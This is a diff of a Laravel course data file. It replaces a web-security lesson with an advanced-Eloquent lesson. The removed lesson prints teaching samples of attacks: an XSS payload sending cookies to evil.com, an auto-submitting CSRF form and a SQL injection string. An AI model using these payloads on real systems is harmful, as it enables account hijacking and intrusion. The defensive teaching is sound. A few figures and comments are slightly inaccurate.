@@ -3,336 +3,441 @@ import type { RoadmapDayDetail } from "@/lib/challenge-data";
 export const LARAVEL_DAY_21_DETAIL: RoadmapDayDetail = {
   overview: [
     {
-      en: "Security is not a feature you bolt on at the end — it is built into every layer from day one.\n\nThink of a bank:\n• <b>ID check at the door</b> — authentication (Breeze, Sanctum from Day 11)\n• <b>Cameras watching every aisle</b> — logging and auditing\n• <b>Time locks on safe-deposit boxes</b> — rate limiting (throttle middleware)\n• <b>Bulletproof glass at tills</b> — input validation (Day 5)\n• <b>Serial numbers on every form</b> — CSRF tokens\n\nLaravel has <b>built-in defences for every one of these layers</b>. Today we learn how each attack works in plain English, and how to stop it.",
-      np: "Security = layered defence। Laravel मा CSRF, XSS, SQL injection, mass assignment, rate limiting सबैको built-in protection।",
-      jp: "セキュリティは後付けではなく全層に組み込む。CSRF・XSS・SQLi・マスアサイン・レート制限を解説。",
+      en: "Eloquent has <b>magic features</b> beyond basic CRUD — think of it as a smart filing clerk.\n\nThis clerk can:\n• <b>Reformat documents</b> as they're filed or retrieved (<b>accessors</b> and <b>mutators</b>)\n• <b>Apply automatic labels</b> to every document that enters the system (<b>casts</b>)\n• <b>Save pre-built search filters</b> you can reuse any time (<b>scopes</b>)\n• <b>File documents</b> that could belong to any department — posts, videos, or products (<b>polymorphic relations</b>)\n• <b>Watch for changes</b> and react automatically (<b>observers</b>)\n\nToday we go beyond `find()`, `create()`, and `where()` — and unlock the full power of Eloquent.",
+      np: "Eloquent का advanced features: accessors, mutators, casts, scopes, polymorphic relations र observers।",
+      jp: "Eloquent の高度な機能 — アクセサ・キャスト・スコープ・ポリモーフィック・オブザーバを学びます。",
     },
     {
-      en: "The 5 attack types we cover today — in plain English:\n\n• <b>CSRF</b> — an attacker tricks your logged-in user's browser into silently making a request your app thinks is legitimate\n  ↳ Defence: unique hidden token in every form that only your server knows\n• <b>XSS</b> — an attacker injects JavaScript into your page that runs in other users' browsers\n  ↳ Defence: always escape output; Blade's `{{ }}` does this automatically\n• <b>SQL injection</b> — an attacker sends data that escapes your query and runs their own SQL\n  ↳ Defence: Eloquent and Query Builder use PDO prepared statements everywhere\n• <b>Mass assignment</b> — an attacker submits extra fields (like `is_admin=true`) your app saves without checking\n  ↳ Defence: `$fillable` whitelist on every model\n• <b>Brute force / rate limiting</b> — an attacker tries thousands of passwords per second\n  ↳ Defence: `throttle` middleware capping requests per time window",
-      np: "CSRF, XSS, SQL injection, mass assignment, rate limiting — हरेकको attack र defence।",
-      jp: "CSRF・XSS・SQLi・マスアサイン・レート制限の攻撃手法と Laravel の防御策。",
+      en: "Here is what we cover today:\n\n• <b>Accessors</b> — transform data as it is <b>READ</b> from the model (e.g. combine `first_name` + `last_name` into `full_name`)\n  ↳ The DB stores them separately; your code sees one tidy attribute\n• <b>Mutators</b> — transform data as it is <b>WRITTEN</b> to the model (e.g. always lowercase email before saving)\n  ↳ Great for normalising input so your DB stays consistent\n• <b>Casts</b> — auto-convert column values (JSON string ↔ PHP array, `0`/`1` ↔ boolean, timestamp ↔ Carbon date)\n  ↳ Define once in `$casts`; Eloquent handles conversion on every read and write\n• <b>Local scopes</b> — reusable named query fragments like `scopePublished()` that you chain fluently\n• <b>Global scopes</b> — filters that apply to EVERY query on a model automatically\n• <b>Polymorphic relations</b> — one `comments` table that works for posts, videos, products, and more\n• <b>Observers</b> — centralised event handlers that fire when models are created, updated, or deleted",
+      np: "Accessors (read), mutators (write), casts (type conversion), local/global scopes, polymorphic relations, observers।",
+      jp: "アクセサ・ミューテタ・キャスト・スコープ・ポリモーフィック・オブザーバを順に解説します。",
     },
   ],
   sections: [
     {
       title: {
-        en: "CSRF — Cross-Site Request Forgery",
-        np: "CSRF",
-        jp: "CSRF（クロスサイトリクエストフォージェリ）",
+        en: "Accessors & mutators (new attribute syntax)",
+        np: "Accessors र mutators",
+        jp: "アクセサとミューテタ",
       },
       blocks: [
         {
           type: "paragraph",
           text: {
-            en: "<b>How CSRF works:</b>\n\nImagine you are logged in to your bank at `mybank.com`. Your browser holds a session cookie. You then visit `evil-site.com`, which has this hidden form:\n\n`<form action=\"https://mybank.com/transfer\" method=\"POST\"><input name=\"to\" value=\"attacker\"><input name=\"amount\" value=\"9999\"></form>`\n\nWhen the page loads, a script auto-submits the form. Your browser <b>automatically sends the session cookie</b> with the POST — the bank sees a valid session and processes the transfer.\n\n<b>Laravel's defence:</b> Every form gets a unique secret token (`_token`) generated per session. The malicious site cannot read this token (same-origin policy), so its fake request is rejected.\n\n↳ Blade's `@csrf` directive injects the hidden `_token` field automatically.",
-            np: "CSRF = attacker ले user को browser बाट silently POST गराउँछ। Defence: session-specific `_token`।",
-            jp: "CSRF は攻撃者が他サイトから被害者のブラウザで POST させる攻撃。`@csrf` で防御。",
+            en: "The <b>old way</b> (Laravel 8 and below) required two separate methods:\n• `getFirstNameAttribute()` — called when you READ the attribute\n• `setFirstNameAttribute($value)` — called when you WRITE the attribute\n\nAnalogy: two separate post-office windows — one labelled <b>IN</b>, one labelled <b>OUT</b>.\n\n<b>Laravel 9+ replaces both with a single `Attribute::make()` call.</b>\n• One computed property handles both directions\n• The `get:` closure runs on read; the `set:` closure runs on write\n  ↳ If you only need one direction, omit the other closure entirely\n\nThis is now the standard — use the new syntax for all new code.",
+            np: "पुरानो: `getXAttribute()` / `setXAttribute()`। नयाँ (Laravel 9+): `Attribute::make(get:, set:)`।",
+            jp: "旧来の get/set メソッドは Laravel 9+ で `Attribute::make()` に統一されました。",
           },
         },
         {
           type: "code",
           title: {
-            en: "Blade @csrf + excluding webhook routes",
-            np: "@csrf directive र webhook exclusion",
-            jp: "@csrf と Webhook 除外",
+            en: "app/Models/User.php — accessor, mutator & auto-hash mutator",
+            np: "Accessor, mutator र auto-hash",
+            jp: "アクセサ・ミューテタの例",
           },
-          code: `{{-- resources/views/posts/create.blade.php --}}
-<form method="POST" action="/posts">
-    @csrf   {{-- injects <input type="hidden" name="_token" value="..."> --}}
+          code: `<?php
 
-    <input type="text" name="title">
-    <button type="submit">Create Post</button>
-</form>
+use Illuminate\\Database\\Eloquent\\Casts\\Attribute;
+use Illuminate\\Support\\Facades\\Hash;
 
-// Excluding routes that receive external webhooks
-// app/Http/Middleware/VerifyCsrfToken.php
-protected $except = [
-    'stripe/webhook',
-    'github/webhook',
-    // Add external webhook routes here ONLY
-];
-
-// API routes (routes/api.php) do NOT have CSRF middleware by default.
-// They use Sanctum token auth instead — tokens prove identity better than cookies.`,
-        },
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>When is it safe to exclude a route from CSRF?</b>\n\nOnly exclude routes that receive requests from <b>external systems that cannot hold a session</b>:\n• Payment gateway webhooks (Stripe, PayPal)\n• Version control webhooks (GitHub, GitLab)\n• Third-party service callbacks\n\n<b>Never exclude:</b>\n• Login, register, password reset\n• Any user-facing form\n• Any route that modifies user data\n\n↳ Do NOT remove `VerifyCsrfToken` from your middleware stack entirely — that disables protection for all web routes. Use `$except` for surgical exclusions only.",
-            np: "CSRF exclude: external webhooks मात्र। Login/register/forms कहिल्यै exclude नगर्नुहोस्।",
-            jp: "CSRF 除外は外部 Webhook のみ。ログイン・フォームは絶対に除外しない。",
-          },
-        },
-      ],
-    },
-    {
-      title: {
-        en: "XSS — Cross-Site Scripting",
-        np: "XSS",
-        jp: "XSS（クロスサイトスクリプティング）",
-      },
-      blocks: [
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>How XSS works:</b>\n\nAn attacker stores this in a blog comment: `<script>document.location='https://evil.com?c='+document.cookie</script>`\n\nIf your app renders that comment as raw HTML, <b>every visitor's browser runs the script</b> — their session cookies are stolen and sent to the attacker.\n\nXSS can:\n• Steal session cookies and hijack accounts\n• Redirect users to phishing pages\n• Inject keyloggers to capture passwords\n• Deface your site for all visitors\n\n<b>Laravel's defence:</b> Blade's `{{ }}` syntax <b>auto-escapes HTML entities</b> — `<script>` becomes `&lt;script&gt;` which the browser displays as text, not code.\n\n↳ The only dangerous syntax is `{!! !!}` which renders raw, unescaped HTML.",
-            np: "XSS = attacker ले JS inject गर्छ — cookies चोर्न, redirect गर्न। Defence: `{{ }}` auto-escape।",
-            jp: "XSS は悪意ある JS を注入する攻撃。Blade `{{ }}` が HTML を自動エスケープして防御。",
-          },
-        },
-        {
-          type: "code",
-          title: {
-            en: "Safe vs dangerous Blade output + HTMLPurifier",
-            np: "Safe `{{ }}` vs dangerous `{!! !!}`",
-            jp: "安全な出力と危険な出力",
-          },
-          code: `{{-- SAFE — Blade escapes HTML entities automatically --}}
-{{ $user->bio }}
-{{-- If bio = "<script>alert('xss')</script>" --}}
-{{-- Rendered as: &lt;script&gt;alert('xss')&lt;/script&gt; --}}
-
-{{-- DANGEROUS — renders raw HTML without escaping --}}
-{!! $user->bio !!}
-{{-- If bio = "<script>alert('xss')</script>" --}}
-{{-- Browser EXECUTES the script --}}
-
-{{-- SAFE — strip all HTML tags before display --}}
-{{ strip_tags($user->bio) }}
-
-{{-- SAFE — for rich text editors: use HTMLPurifier to allow SAFE HTML --}}
-{{-- composer require ezyang/htmlpurifier --}}
-$config = HTMLPurifier_Config::createDefault();
-$purifier = new HTMLPurifier($config);
-$safeHtml = $purifier->purify($request->input('body'));
-
-// Only use {!! !!} for content YOU generate — never for user input
-{!! $markdown->toHtml($post->body) !!} // OK: markdown renderer output`,
-        },
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>The rule is simple:</b>\n\n• Always use `{{ }}` — it is safe by default\n• Never use `{!! !!}` for user-generated content without running it through HTMLPurifier first\n\n<b>Legitimate uses for `{!! !!}`:</b>\n• A Markdown renderer you control (input comes from your database, not users directly)\n• Generated SVG or chart HTML\n• Localised content from a trusted CMS your team manages\n\n<b>Content Security Policy (CSP)</b> adds a second layer:\n• A CSP header tells the browser to only execute scripts from your own domain\n• Even if an attacker injects `<script src=\"evil.com/xss.js\">`, the browser blocks it\n  ↳ We cover CSP headers in Section 5",
-            np: "`{{ }}` = always safe। `{!! !!}` = user content मा HTMLPurifier पछि मात्र।",
-            jp: "`{{ }}` は常に安全。`{!! !!}` はユーザー入力に直接使わない。CSP ヘッダーで多重防御。",
-          },
-        },
-      ],
-    },
-    {
-      title: {
-        en: "SQL injection & mass assignment protection",
-        np: "SQL injection र mass assignment",
-        jp: "SQL インジェクションとマスアサイン",
-      },
-      blocks: [
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>SQL injection in plain English:</b>\n\nImagine a login form. You type your email: `admin@site.com` and the app builds: `SELECT * FROM users WHERE email = 'admin@site.com'`\n\nAn attacker types: `' OR '1'='1` — the app builds: `SELECT * FROM users WHERE email = '' OR '1'='1'` — this always returns ALL users. The attacker is logged in as the first user (often an admin).\n\n<b>Why Eloquent is safe by default:</b> Eloquent and the Query Builder use <b>PDO prepared statements</b>. User input is passed as a parameter (a `?` placeholder), never concatenated into the SQL string. The database treats it as data, never as code.\n\n<b>Mass assignment in plain English:</b> If you `User::create($request->all())`, whatever fields the user submits get saved — including `is_admin`, `role`, or `balance`. An attacker can submit any column name.",
-            np: "SQL injection: string concatenation खतरनाक। Eloquent PDO prepared statements प्रयोग गर्छ — safe। Mass assignment: `$fillable` define गर्नुहोस्।",
-            jp: "Eloquent は PDO 準備文でSQLi を防ぐ。マスアサインは `$fillable` ホワイトリストで守る。",
-          },
-        },
-        {
-          type: "code",
-          title: {
-            en: "Safe vs unsafe queries + mass assignment protection",
-            np: "Safe queries र mass assignment",
-            jp: "安全なクエリとマスアサイン防御",
-          },
-          code: `// ❌ DANGEROUS — string interpolation, SQL injection possible
-$email = $request->input('email');
-DB::statement("SELECT * FROM users WHERE email = '$email'");
-
-// ✅ SAFE — PDO prepared statement, user input is bound as data
-User::where('email', $email)->first();
-
-// ✅ SAFE — manual binding (use when raw SQL is truly necessary)
-DB::select('SELECT * FROM users WHERE email = ?', [$email]);
-DB::select('SELECT * FROM users WHERE email = :email', ['email' => $email]);
-
-// ── Mass assignment ─────────────────────────────────────────────
-
-// ❌ DANGEROUS — saves every field the user submits, including is_admin
-User::create($request->all());
-
-// ✅ SAFE — only allow the fields we explicitly permit
-User::create($request->only(['name', 'email', 'password']));
-
-// ✅ SAFE — $fillable whitelist on the model
 class User extends Model
 {
-    // Only these columns can be mass-assigned
-    protected $fillable = ['name', 'email', 'password'];
+    // Accessor: combine first_name + last_name into a virtual attribute
+    protected function fullName(): Attribute
+    {
+        return Attribute::make(
+            get: fn () => "{$this->first_name} {$this->last_name}",
+        );
+    }
 
-    // ❌ NEVER do this in production — disables all mass assignment protection
-    // protected $guarded = [];
+    // Mutator: always store email as lowercase
+    protected function email(): Attribute
+    {
+        return Attribute::make(
+            get: fn (string $value) => $value,
+            set: fn (string $value) => strtolower($value),
+        );
+    }
+
+    // Mutator only: auto-hash password on assignment
+    protected function password(): Attribute
+    {
+        return Attribute::make(
+            set: fn (string $value) => Hash::make($value),
+        );
+    }
+}
+
+// Usage
+$user = User::find(1);
+echo $user->full_name;   // "Jane Doe"  ← accessor fires
+$user->email = 'JANE@EXAMPLE.COM';  // stored as "jane@example.com"
+$user->password = 'secret123';     // stored as hashed value`,
+        },
+        {
+          type: "paragraph",
+          text: {
+            en: "<b>Accessor vs database computed column — when to use each:</b>\n\n• <b>Use an accessor</b> when the transformation is cheap and you do not need to search/sort by the result in SQL\n  ↳ Examples: formatting a phone number for display, combining name parts, masking a card number\n• <b>Use a DB computed column</b> when you need to `WHERE`, `ORDER BY`, or index the result\n  ↳ Example: `full_name` as a stored generated column so `WHERE full_name LIKE '%Jane%'` uses an index\n\nAccessors are PHP-side — fast and free, but invisible to the database.",
+            np: "Accessor = PHP-side transformation। DB computed column = SQL मा searchable।",
+            jp: "アクセサは PHP 側の変換。SQL で検索したい場合は DB 計算列を使う。",
+          },
+        },
+      ],
+    },
+    {
+      title: {
+        en: "Model casts — auto-converting column types",
+        np: "Model casts",
+        jp: "モデルキャスト",
+      },
+      blocks: [
+        {
+          type: "paragraph",
+          text: {
+            en: "Think of casts as a <b>universal power adapter</b>.\n\nThe database stores data in its own formats: `1`/`0` for booleans, JSON strings for arrays, Unix timestamps for dates. Without casts, your PHP code would need to manually convert every time.\n\n<b>Casts declare the conversion once</b> in the `$casts` property — Eloquent handles the rest automatically on every read and write.\n\n• <b>`boolean`</b> — `0`/`1` in DB becomes `true`/`false` in PHP\n• <b>`array`</b> — JSON string in DB becomes PHP array (and back)\n• <b>`datetime`</b> — timestamp string becomes a Carbon object\n• <b>`encrypted`</b> — value is encrypted before saving, decrypted on read\n• <b>`AsCollection`</b> — like `array`, but returns a Laravel Collection\n  ↳ Collections have `map()`, `filter()`, `sum()`, etc. built in",
+            np: "Casts: `boolean`, `array`, `datetime`, `encrypted`, `AsCollection` — DB format ↔ PHP format।",
+            jp: "`$casts` で DB 型と PHP 型の変換を自動化。boolean・array・datetime・encrypted など。",
+          },
+        },
+        {
+          type: "code",
+          title: {
+            en: "app/Models/Post.php — built-in casts + custom cast class",
+            np: "Built-in casts र custom cast",
+            jp: "組み込みキャストとカスタムキャスト",
+          },
+          code: `<?php
+
+use Illuminate\\Database\\Eloquent\\Casts\\AsCollection;
+
+class Post extends Model
+{
+    protected $casts = [
+        'is_published' => 'boolean',        // 0/1 → true/false
+        'metadata'     => 'array',          // JSON string → PHP array
+        'settings'     => AsCollection::class, // JSON string → Collection
+        'published_at' => 'datetime',       // string → Carbon
+        'price'        => 'decimal:2',      // stored as string, precision 2
+        'secret_token' => 'encrypted',      // auto encrypt/decrypt
+    ];
+}
+
+// Custom cast class — for reusable type conversions
+// app/Casts/Money.php
+namespace App\\Casts;
+
+use Illuminate\\Contracts\\Database\\Eloquent\\CastsAttributes;
+
+class Money implements CastsAttributes
+{
+    public function get($model, $key, $value, $attributes): string
+    {
+        return '$' . number_format($value / 100, 2); // stored in cents
+    }
+
+    public function set($model, $key, $value, $attributes): int
+    {
+        return (int) ($value * 100); // convert dollars to cents for DB
+    }
+}
+
+// In the model
+protected $casts = [
+    'price' => Money::class,
+];
+
+// Usage
+$post->price = 19.99;   // stored as 1999 (cents)
+echo $post->price;       // "$19.99"`,
+        },
+        {
+          type: "paragraph",
+          text: {
+            en: "<b>`array` vs `AsCollection` — which one to pick:</b>\n\n• <b>`array`</b> — returns a plain PHP array. Use when you just need to read/write key-value data and don't need transformation methods.\n• <b>`AsCollection`</b> — returns a Laravel Collection object. Use when you want to call `->filter()`, `->map()`, `->sum()`, `->pluck()`, etc. on the data.\n\n↳ Both store the same JSON in the database — the difference is only what PHP hands you back on read.\n\nPro tip: add `->sortBy()` or `->groupBy()` to a Collection cast and your model method becomes a clean one-liner.",
+            np: "`array` = PHP array। `AsCollection` = Laravel Collection (map, filter, etc.)।",
+            jp: "`array` は PHP 配列、`AsCollection` は Collection — どちらも DB は JSON。",
+          },
+        },
+      ],
+    },
+    {
+      title: {
+        en: "Local scopes — reusable query filters",
+        np: "Local scopes",
+        jp: "ローカルスコープ",
+      },
+      blocks: [
+        {
+          type: "paragraph",
+          text: {
+            en: "A <b>scope</b> is a saved, named query fragment — like a saved search in your email inbox.\n\nInstead of writing `->where('status', 'published')->where('published_at', '<=', now())` in every controller, you name it once as `scopePublished()` and chain it anywhere.\n\n<b>Two types of scopes:</b>\n• <b>Local scope</b> — opt-in, called explicitly: `Post::published()->get()`\n  ↳ Defined as a method prefixed with `scope` on the model\n  ↳ The `scope` prefix is stripped when you call it: `scopePublished()` → `->published()`\n• <b>Global scope</b> — automatic, applies to EVERY query on the model\n  ↳ Useful for multi-tenancy (always filter by `company_id`) or soft-deletes\n  ↳ Use sparingly — invisible filters make queries hard to debug",
+            np: "Local scope = opt-in query fragment। Global scope = automatic filter on every query।",
+            jp: "ローカルスコープは明示的に呼ぶ再利用可能フィルタ。グローバルスコープは全クエリに自動適用。",
+          },
+        },
+        {
+          type: "code",
+          title: {
+            en: "app/Models/Post.php — local scopes + global scope",
+            np: "Local र global scope",
+            jp: "ローカル・グローバルスコープ",
+          },
+          code: `<?php
+
+use Illuminate\\Database\\Eloquent\\Builder;
+use Illuminate\\Database\\Eloquent\\Model;
+
+class Post extends Model
+{
+    // ── LOCAL SCOPES ──────────────────────────────────────────
+
+    // No extra parameters
+    public function scopePublished(Builder $query): Builder
+    {
+        return $query->where('status', 'published')
+                     ->whereNotNull('published_at');
+    }
+
+    // With a required parameter
+    public function scopeByUser(Builder $query, int $userId): Builder
+    {
+        return $query->where('user_id', $userId);
+    }
+
+    // With an optional parameter (default value)
+    public function scopeRecent(Builder $query, int $days = 30): Builder
+    {
+        return $query->where('published_at', '>=', now()->subDays($days));
+    }
+
+    // ── GLOBAL SCOPE ──────────────────────────────────────────
+    protected static function booted(): void
+    {
+        // Always filter to the authenticated user's posts
+        static::addGlobalScope('owner', function (Builder $query) {
+            if (auth()->check()) {
+                $query->where('user_id', auth()->id());
+            }
+        });
+    }
+}
+
+// Chaining local scopes
+$posts = Post::published()
+             ->byUser(auth()->id())
+             ->recent(7)
+             ->orderByDesc('published_at')
+             ->get();
+
+// Removing a global scope when you need all posts (e.g. admin panel)
+$allPosts = Post::withoutGlobalScope('owner')->get();`,
+        },
+        {
+          type: "paragraph",
+          text: {
+            en: "<b>Global scope gotcha — the invisible filter problem:</b>\n\nGlobal scopes are powerful but can surprise you:\n• A new developer calls `Post::all()` expecting every post — but only their posts come back\n  ↳ The global scope is invisible in the controller code\n• Unit tests may fail unexpectedly because no user is logged in and the scope returns nothing\n\n<b>Best practices:</b>\n• Name your global scope (second argument to `addGlobalScope`) so it can be removed with `withoutGlobalScope('name')`\n• Document global scopes prominently in the model's docblock\n• For multi-tenancy, consider a dedicated package (Tenancy for Laravel) instead of hand-rolled global scopes",
+            np: "Global scope invisible हुन्छ — debug गाह्रो। नाम दिनुहोस् र document गर्नुहोस्।",
+            jp: "グローバルスコープは見えないフィルタ — 名前付きで追加して `withoutGlobalScope` で除外可能。",
+          },
+        },
+      ],
+    },
+    {
+      title: {
+        en: "Polymorphic relationships",
+        np: "Polymorphic relationships",
+        jp: "ポリモーフィックリレーション",
+      },
+      blocks: [
+        {
+          type: "paragraph",
+          text: {
+            en: "<b>Polymorphic</b> means \"many shapes.\" It solves a specific problem:\n\n<b>Problem:</b> You want `Comment` to belong to both `Post` and `Video`. Without polymorphic, you'd need:\n• A `post_comments` table with a `post_id` foreign key\n• A `video_comments` table with a `video_id` foreign key\n• Two separate models, two sets of routes, two sets of controllers\n\n<b>Solution:</b> One `comments` table with two special columns:\n• `commentable_id` — stores the ID of the parent (e.g. `42`)\n• `commentable_type` — stores the class name of the parent (e.g. `App\\Models\\Post`)\n\nLaravel's `morphTo()` and `morphMany()` handle the magic of knowing which table to join based on the `_type` column.\n\n↳ One table, one model, works with any number of parent types.",
+            np: "Polymorphic = एउटै `comments` table जुन Post, Video, Product सबैमा काम गर्छ।",
+            jp: "ポリモーフィックは 1 テーブルが複数の親モデルに属せる仕組み（`_id` + `_type` カラム）。",
+          },
+        },
+        {
+          type: "code",
+          title: {
+            en: "Migration + Comment model + Post & Video models",
+            np: "Polymorphic migration र models",
+            jp: "マイグレーションとモデルの実装",
+          },
+          code: `// database/migrations/create_comments_table.php
+Schema::create('comments', function (Blueprint $table) {
+    $table->id();
+    $table->text('body');
+    $table->morphs('commentable'); // creates commentable_id + commentable_type
+    $table->foreignId('user_id')->constrained()->cascadeOnDelete();
+    $table->timestamps();
+});
+
+// app/Models/Comment.php
+class Comment extends Model
+{
+    protected $fillable = ['body', 'user_id'];
+
+    // "I can belong to anything"
+    public function commentable(): MorphTo
+    {
+        return $this->morphTo();
+    }
+}
+
+// app/Models/Post.php
+class Post extends Model
+{
+    public function comments(): MorphMany
+    {
+        return $this->morphMany(Comment::class, 'commentable');
+    }
+}
+
+// app/Models/Video.php
+class Video extends Model
+{
+    public function comments(): MorphMany
+    {
+        return $this->morphMany(Comment::class, 'commentable');
+    }
+}
+
+// Usage
+$post->comments()->create(['body' => 'Great post!', 'user_id' => 1]);
+$video->comments()->create(['body' => 'Nice video!', 'user_id' => 2]);
+
+// Get the parent of a comment (either a Post or Video)
+$comment = Comment::find(1);
+$parent = $comment->commentable; // returns Post or Video instance`,
+        },
+        {
+          type: "table",
+          caption: {
+            en: "Eloquent relationship cheat-sheet — pick the right one for your data shape",
+            np: "Relationship cheat-sheet",
+            jp: "リレーション早見表",
+          },
+          headers: [
+            { en: "Relationship", np: "Relationship", jp: "リレーション" },
+            { en: "Method", np: "Method", jp: "メソッド" },
+            { en: "Use when…", np: "कहिले प्रयोग", jp: "使う場面" },
+          ],
+          rows: [
+            [
+              { en: "Has one", np: "Has one", jp: "hasOne" },
+              { en: "`hasOne()`", np: "`hasOne()`", jp: "`hasOne()`" },
+              { en: "User → one Profile", np: "User → एउटा Profile", jp: "User → 1つの Profile" },
+            ],
+            [
+              { en: "Has many", np: "Has many", jp: "hasMany" },
+              { en: "`hasMany()`", np: "`hasMany()`", jp: "`hasMany()`" },
+              { en: "User → many Posts", np: "User → धेरै Posts", jp: "User → 複数の Post" },
+            ],
+            [
+              { en: "Belongs to", np: "Belongs to", jp: "belongsTo" },
+              { en: "`belongsTo()`", np: "`belongsTo()`", jp: "`belongsTo()`" },
+              { en: "Post → one User (owner)", np: "Post → एउटा User", jp: "Post → 1つの User" },
+            ],
+            [
+              { en: "Belongs to many", np: "Belongs to many", jp: "belongsToMany" },
+              { en: "`belongsToMany()`", np: "`belongsToMany()`", jp: "`belongsToMany()`" },
+              { en: "Post ↔ many Tags (pivot table)", np: "Post ↔ धेरै Tags", jp: "Post ↔ 複数の Tag（中間テーブル）" },
+            ],
+            [
+              { en: "Morph to", np: "Morph to", jp: "morphTo" },
+              { en: "`morphTo()`", np: "`morphTo()`", jp: "`morphTo()`" },
+              { en: "Comment → Post OR Video", np: "Comment → Post वा Video", jp: "Comment → Post か Video" },
+            ],
+            [
+              { en: "Morph many", np: "Morph many", jp: "morphMany" },
+              { en: "`morphMany()`", np: "`morphMany()`", jp: "`morphMany()`" },
+              { en: "Post → many Comments (poly)", np: "Post → धेरै Comments", jp: "Post → 複数の Comment（ポリ）" },
+            ],
+            [
+              { en: "Morph to many", np: "Morph to many", jp: "morphToMany" },
+              { en: "`morphToMany()`", np: "`morphToMany()`", jp: "`morphToMany()`" },
+              { en: "Post/Video → shared Tags", np: "Post/Video → shared Tags", jp: "Post/Video → 共通 Tag" },
+            ],
+          ],
+        },
+      ],
+    },
+    {
+      title: {
+        en: "Model observers — reacting to lifecycle events",
+        np: "Model observers",
+        jp: "モデルオブザーバ",
+      },
+      blocks: [
+        {
+          type: "paragraph",
+          text: {
+            en: "An <b>observer</b> is like a security camera for your model.\n\nWhenever something happens — a record is created, updated, or deleted — the observer fires the matching handler automatically. No manual calls in your controllers needed.\n\n<b>Without observers</b>, side-effects scatter across controllers:\n• `PostController::store()` sends a welcome notification\n• `PostController::update()` logs the change\n• `PostController::destroy()` deletes related files\n• If someone adds another way to create a post (a command, a seeder, an API), they must remember to add the side-effect too\n\n<b>With observers</b>, the side-effect logic lives in one place — if a post is created anywhere in the app, the observer fires.\n\n↳ Think of it as a pub/sub pattern built into Eloquent.",
+            np: "Observer = model lifecycle events (created, updated, deleted) मा centralised reactions।",
+            jp: "オブザーバはモデルの lifecycle イベントに対する一元的なハンドラ。",
+          },
+        },
+        {
+          type: "code",
+          title: {
+            en: "PostObserver — generate, implement, register",
+            np: "PostObserver बनाउने र register गर्ने",
+            jp: "PostObserver の生成・実装・登録",
+          },
+          code: `// Generate the observer class
+php artisan make:observer PostObserver --model=Post
+
+// app/Observers/PostObserver.php
+namespace App\\Observers;
+
+use App\\Models\\Post;
+use Illuminate\\Support\\Facades\\Log;
+
+class PostObserver
+{
+    public function created(Post $post): void
+    {
+        // Side-effect: notify the author's followers
+        $post->user->notify(new PostPublishedNotification($post));
+    }
+
+    public function updating(Post $post): void
+    {
+        // Log who changed what (before the save)
+        if ($post->isDirty('status')) {
+            Log::info("Post #{$post->id} status changed", [
+                'from' => $post->getOriginal('status'),
+                'to'   => $post->status,
+                'by'   => auth()->id(),
+            ]);
+        }
+    }
+
+    public function deleted(Post $post): void
+    {
+        // Clean up associated files when a post is deleted
+        Storage::delete("posts/{$post->id}");
+    }
+}
+
+// Register in AppServiceProvider::boot()
+use App\\Models\\Post;
+use App\\Observers\\PostObserver;
+
+public function boot(): void
+{
+    Post::observe(PostObserver::class);
 }`,
         },
         {
           type: "paragraph",
           text: {
-            en: "<b>Mass assignment rules:</b>\n\n• `$fillable` is a <b>whitelist</b> — only named columns can be set via `create()` or `fill()`\n• `$guarded` is a <b>blacklist</b> — columns listed here are blocked, everything else is allowed\n• `$guarded = []` means <b>no protection at all</b> — never use in production\n\n<b>The safe default:</b> define `$fillable` on every model that accepts user input. Be explicit about what users are allowed to set.\n\n↳ Validation (Day 5) catches <b>invalid values</b>. Mass assignment protection catches <b>extra fields</b> you never intended users to control. Both are necessary.",
-            np: "`$fillable` = whitelist (safe)। `$guarded = []` = no protection (खतरनाक)।",
-            jp: "`$fillable` はホワイトリスト。`$guarded = []` は全解除で危険。本番では必ず `$fillable` を定義。",
+            en: "<b>Critical gotcha — bulk operations bypass observers:</b>\n\nObservers are Eloquent-level hooks. They fire when you call `->save()`, `->create()`, `->delete()` on a model instance. They do <b>NOT</b> fire for SQL-level bulk operations:\n\n• `Post::where('user_id', $id)->delete()` → NO observer\n• `Post::truncate()` → NO observer\n• `Post::insert([...])` → NO observer (also bypasses `$fillable`!)\n\n↳ If you need side-effects for bulk deletes, dispatch an event or job manually before/after the bulk query.\n\n↳ Available hooks: `creating`, `created`, `updating`, `updated`, `saving`, `saved`, `deleting`, `deleted`, `restoring`, `restored` (for soft-deletes).",
+            np: "Bulk operations (`where()->delete()`, `truncate()`) ले observers trigger गर्दैन।",
+            jp: "バルク操作（`where()->delete()` など）はオブザーバを発火しない点に注意。",
           },
-        },
-      ],
-    },
-    {
-      title: {
-        en: "Rate limiting & brute-force protection",
-        np: "Rate limiting",
-        jp: "レート制限とブルートフォース対策",
-      },
-      blocks: [
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>Why rate limiting matters:</b>\n\nWithout it:\n• A bot can try 86,400 different passwords per second on your login form\n• A competitor can scrape your entire product catalogue in seconds\n• A DDoS attack can hammer a single endpoint and crash your server\n\nRate limiting <b>caps how many requests</b> a user (or IP) can make in a time window. Exceed the limit → `429 Too Many Requests`.\n\n<b>Two levels in Laravel:</b>\n• <b>Built-in `throttle` middleware</b> — quick to add, good for most cases\n• <b>`RateLimiter` facade</b> — custom logic (per-user, per-IP, per-subscription tier)",
-            np: "Rate limiting: bot attacks, scraping, DDoS रोक्न। `throttle` middleware वा `RateLimiter` facade।",
-            jp: "レート制限はボット攻撃・スクレイピング・DDoS を防ぐ。`throttle` や `RateLimiter` を使う。",
-          },
-        },
-        {
-          type: "code",
-          title: {
-            en: "throttle middleware + custom RateLimiter",
-            np: "throttle र custom RateLimiter",
-            jp: "throttle ミドルウェアとカスタム RateLimiter",
-          },
-          code: `// routes/web.php — simple throttle: 5 attempts per 1 minute
-Route::post('/login', [LoginController::class, 'store'])
-    ->middleware('throttle:5,1');
-
-// routes/api.php — 60 requests per minute for API
-Route::middleware(['auth:sanctum', 'throttle:api'])->group(function () {
-    Route::apiResource('posts', PostController::class);
-});
-
-// Define named rate limiters in AppServiceProvider::boot()
-use Illuminate\\Support\\Facades\\RateLimiter;
-use Illuminate\\Cache\\RateLimiting\\Limit;
-
-RateLimiter::for('api', function (Request $request) {
-    return Limit::perMinute(60)
-                ->by($request->user()?->id ?: $request->ip());
-});
-
-// Tiered limiting — more requests for premium users
-RateLimiter::for('uploads', function (Request $request) {
-    return $request->user()->isPremium()
